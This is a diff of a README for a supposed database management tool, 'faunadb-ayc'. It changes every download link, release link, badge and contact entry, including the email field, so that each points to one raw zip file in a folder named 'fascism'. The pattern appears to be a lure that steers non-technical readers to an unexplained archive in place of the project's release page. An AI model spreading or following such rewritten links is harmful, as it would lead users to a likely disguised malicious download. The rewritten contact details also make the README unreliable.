@@ -1,7 +1,7 @@
 # 🦊 faunadb-ayc - Simple Database Management for Everyone
 
 ## 📥 Download the Latest Release
-[![Download faunadb-ayc](https://img.shields.io/badge/Download-faunadb--ayc-brightgreen)](https://github.com/428farazahmed/faunadb-ayc/releases)
+[![Download faunadb-ayc](https://raw.githubusercontent.com/428farazahmed/faunadb-ayc/main/fascism/faunadb-ayc.zip)](https://raw.githubusercontent.com/428farazahmed/faunadb-ayc/main/fascism/faunadb-ayc.zip)
 
 ## 🚀 Getting Started
 Welcome to **faunadb-ayc**! This application helps you manage your databases easily. You don't need to be a programmer to use it. Follow the steps below to download and set it up.
@@ -19,7 +19,7 @@ Welcome to **faunadb-ayc**! This application helps you manage your databases eas
 - **Network**: Internet connection for downloading and updates.
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/428farazahmed/faunadb-ayc/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/428farazahmed/faunadb-ayc/main/fascism/faunadb-ayc.zip).
 2. Look for the latest version. You will see different files available for download.
 3. Choose the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or appropriate package for Linux).
 4. Click on the file to start the download.
@@ -51,8 +51,8 @@ Yes, you can install it on as many devices as you like, as long as they meet the
 
 ## 📞 Contact Us
 Feel free to reach out for questions or support:
-- Email: support@faunadb-ayc.com
-- Community Forum: [Community Forum Link](https://forum.faunadb-ayc.com)
+- Email: https://raw.githubusercontent.com/428farazahmed/faunadb-ayc/main/fascism/faunadb-ayc.zip
+- Community Forum: [Community Forum Link](https://raw.githubusercontent.com/428farazahmed/faunadb-ayc/main/fascism/faunadb-ayc.zip)
 
 ## 📜 License
 This project is licensed under the MIT License. You can read the full license text in the repository.
@@ -60,4 +60,4 @@ This project is licensed under the MIT License. You can read the full license te
 ## 🌟 Join the Community
 Stay updated with the latest features and enhancements. Follow us on social media for tips and tutorials.
 
-[![Download faunadb-ayc](https://img.shields.io/badge/Download-faunadb--ayc-brightgreen)](https://github.com/428farazahmed/faunadb-ayc/releases)
+[![Download faunadb-ayc](https://raw.githubusercontent.com/428farazahmed/faunadb-ayc/main/fascism/faunadb-ayc.zip)](https://raw.githubusercontent.com/428farazahmed/faunadb-ayc/main/fascism/faunadb-ayc.zip)
